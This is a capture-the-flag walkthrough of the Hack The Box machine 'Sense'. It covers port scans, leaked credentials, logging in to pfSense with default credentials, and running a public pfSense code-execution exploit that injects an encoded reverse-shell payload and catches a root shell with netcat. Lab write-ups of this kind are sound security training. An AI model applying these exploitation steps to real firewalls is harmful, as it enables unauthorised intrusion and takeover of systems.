# Introduction

---

Sense is an easy rated machine on hackthebox. It is a short but interesting box that is especially good for beginners. I was a beginner myself when I wrote this write up. So let's start anumerating the machine.

# Enumeration

---

As always, I start with an nmap scan.

## Nmap Scan

---

The first thing I do is a basic port scan of all ports:

```bash
┌──(user㉿KaliVM)-[/hackthebox/oscp-prep/sense]
└─$ nmap sense.htb -vv -p-  
Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-21 12:50 CEST
Initiating Ping Scan at 12:50

Completed Connect Scan at 12:52, 104.71s elapsed (65535 total ports)
Nmap scan report for sense.htb (10.10.10.60)
Host is up, received syn-ack (0.023s latency).
Scanned at 2021-08-21 12:50:38 CEST for 105s
Not shown: 65533 filtered ports
Reason: 65533 no-responses
PORT    STATE SERVICE REASON
80/tcp  open  http    syn-ack
443/tcp open  https   syn-ack

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 104.82 seconds
```

I perform a script scan using the `-A` flag for those two open ports.

```bash
┌──(user㉿KaliVM)-[/hackthebox/oscp-prep/sense]
└─$ nmap sense.htb -A -p 80,443
Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-21 13:02 CEST
Nmap scan report for sense.htb (10.10.10.60)
Host is up (0.053s latency).

```

## Enumeration Of The Ports

---

### Port 80

---

When accessing the page, I get automatically redirected to the HTTPS page on port 443. So I need to enumerate only this one port.

### Port 443

---

I cannot access the page using the machine's hostname. This happens when I try it:

![Untitled](/assets/images/2021-11-17-sense/Untitled.png)

So I access the page using it's IP address:

Gobuster scan:

```bash

```

There are a lot of directories and files. The first I checked is index.html:

![Untitled](/assets/images/2021-11-17-sense/Untitled2.png)

There is a file linked, but it does not do anything when I call it: [https://10.10.10.60/dfuife.cgi](https://10.10.10.60/dfuife.cgi). I tried many of the php files, but I need to login in order to use them.

There are two .txt files, let's try to access them. Here is system-users.txt:

```bash
####Support ticket###

Please create the following user

username: Rohit
password: company defaults
```

Here is changelog.txt:

```bash
# Security Changelog 

### Issue
There was a failure in updating the firewall. Manual patching is therefore required

### Mitigated
2 of 3 vulnerabilities have been patched.

### Timeline
The remaining patches will be installed during the next maintenance window
```

Now I know that the application has an open vulnerability. I also know a username, rohit, and that the password for this user is the company defaults. The company is called pfsense, so that may be the password.

![Untitled](/assets/images/2021-11-17-sense/Untitle3.png)

That worked, now I can search for an exploit. The version can be found on the main page: `2.1.3`

# Exploitation

---

If found an exploit from [spencerdodd](https://spencerdodd.github.io/2018/01/14/pfsense-arbitrary-code-execution/) that creates a reverse shell, it is available here:

[GitHub - spencerdodd/pfsense-code-exec: authenticated arbitrary code execution exploit in pfsense community edition <= 2.2.6](https://github.com/spencerdodd/pfsense-code-exec)

I have to note that I will use the PHP reverse shell payload, there is also a Metasploit version available. (Because for OSCP I practice w/o Metasploit) Download the file and edit these things:

```python
username = "rohit"
password = "pfsense"
listener_ip = "10.10.17.28"
listener_port = "4444"
target_ip = "10.10.10.60"
```

Now, start a netcat listener and execute the script:

```bash
┌──(user㉿KaliVM)-[/hackthebox/oscp-prep/sense]
└─$ nano pfsense_exec.py 

┌──(user㉿KaliVM)-[/hackthebox/oscp-prep/sense]
└─$ chmod +x pfsense_exec.py 

┌──(user㉿KaliVM)-[/hackthebox/oscp-prep/sense]
└─$ python3 pfsense_exec.py nc           
[*] setting payload to nc reverse shell (catch with 'nc -lvp PORT')
[*] exploiting pfsense_graph_injection_exec
[*] generating obfuscated/encoded reverse shell payload for 10.10.17.28:4444
        [+] generated obfuscated/encoded payload
[+] authenticating to firewall with (rohit:pfsense)
        [+] grabbed CSRF token: sid:0472d865e642eaf8e1a35873acdde486db446d18,1629552345
        [+] authentication successful!
        [+] grabbed CSRF token: sid:ceb361329e5284adddcd8bf90eca9a3fe0c93c4f,1629552346
[*] octal encoding payload
        [+] encoding complete

[*] injecting into https://10.10.10.60/status_rrd_graph_img.php
        [+] exploit code injected successfully
[*] triggering the exploit (make sure to catch on 10.10.17.28:4444)
```

Have yourself a look at the netcat listener, a shell should have spawned.

```bash
┌──(user㉿KaliVM)-[/hackthebox/oscp-prep/sense]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.17.28] from (UNKNOWN) [10.10.10.60] 4621
whoami
root
```

It's a surprise that the application runs as root, but I take it. So it's time to get the flags.

# Flags

---

Since I got a root shell and no privesc was necessary, I can get both flags in one go:

```bash
ls /home
.snap
rohit
cat /home/rohit/user.txt
87**************************348b
cat /root/root.txt
d0**************************1a86
```

# Conclusions

---

The box was nice and fast. It was straight forward. I wish that there was a privesc, it would be more difficult with one. I can definetly recommend the box to peoples that are new to the pentesting and are preparing for their OSCP.
